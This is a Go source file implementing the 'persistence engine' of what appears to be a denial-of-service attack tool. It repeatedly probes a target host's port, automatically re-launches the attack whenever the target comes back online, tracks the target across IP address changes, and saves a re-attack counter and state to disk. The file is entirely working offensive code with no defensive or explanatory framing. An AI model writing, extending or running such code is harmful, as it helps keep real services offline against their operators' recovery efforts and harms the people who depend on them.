package main

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"strconv"
	"sync/atomic"
	"time"
)

type PersistenceEngine struct {
	cfg           *AttackConfig
	origIPs       []string
	currentTarget string
	interval      time.Duration
	done          chan struct{}
	attackRunning atomic.Int32
	reattackCount atomic.Int64
	client        *http.Client
}

func NewPersistenceEngine(cfg *AttackConfig, done chan struct{}) *PersistenceEngine {
	return &PersistenceEngine{
		cfg:      cfg,
		interval: 100 * time.Millisecond,
		done:     done,
		client: &http.Client{
			Timeout: 3 * time.Second,
			Transport: &http.Transport{
				MaxIdleConns:    100,
				MaxConnsPerHost: 100,
			},
		},
	}
}

func (pe *PersistenceEngine) Run(spawnAttack func(target string)) {
	pe.currentTarget = pe.cfg.Target
	for {
		select {
		case <-pe.done:
			return
		default:
		}
		alive := pe.probeTarget()
		if !alive && pe.attackRunning.Load() == 1 {
			pe.interval = 500 * time.Millisecond
		}
		if alive && pe.attackRunning.Load() == 0 {
			fmt.Printf("  [WATCHDOG] Target recovered! Re-attacking (count=%d)\n",
				pe.reattackCount.Add(1))
			pe.interval = 100 * time.Millisecond
			if spawnAttack != nil {
				spawnAttack(pe.currentTarget)
			}
		}
		if !alive && pe.attackRunning.Load() == 0 {
			pe.interval = 1 * time.Second
		}
		time.Sleep(pe.interval)
	}
}

func (pe *PersistenceEngine) probeTarget() bool {
	url := fmt.Sprintf("http://%s:%d/", pe.currentTarget, pe.cfg.Port)
	resp, err := pe.client.Get(url)
	if err == nil {
		resp.Body.Close()
		return true
	}
	addr := net.JoinHostPort(pe.currentTarget, strconv.Itoa(pe.cfg.Port))
	conn, err := net.DialTimeout("tcp", addr, 1*time.Second)
	if err == nil {
		conn.Close()
		return true
	}
	return false
}

func (pe *PersistenceEngine) WatchTargetIP(resolveFn func(string) ([]net.IP, error)) {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-pe.done:
			return
		case <-ticker.C:
			ips, err := resolveFn(pe.currentTarget)
			if err != nil || len(ips) == 0 {
				continue
			}
			newIP := ips[0].String()
			found := false
			for _, orig := range pe.origIPs {
				if newIP == orig {
					found = true
					break
				}
			}
			if !found && len(pe.origIPs) > 0 {
				fmt.Printf("  [WATCHDOG] Target IP changed: %s\n", newIP)
				pe.currentTarget = newIP
				pe.origIPs = append(pe.origIPs, newIP)
			}
		}
	}
}

func (pe *PersistenceEngine) SaveState(filepath string) {
	state := struct {
		Target  string   `json:"target"`
		OrigIPs []string `json:"orig_ips"`
		Count   int64    `json:"reattack_count"`
	}{
		Target:  pe.currentTarget,
		OrigIPs: pe.origIPs,
		Count:   pe.reattackCount.Load(),
	}
	data, _ := json.Marshal(state)
	os.WriteFile(filepath, data, 0644)
}
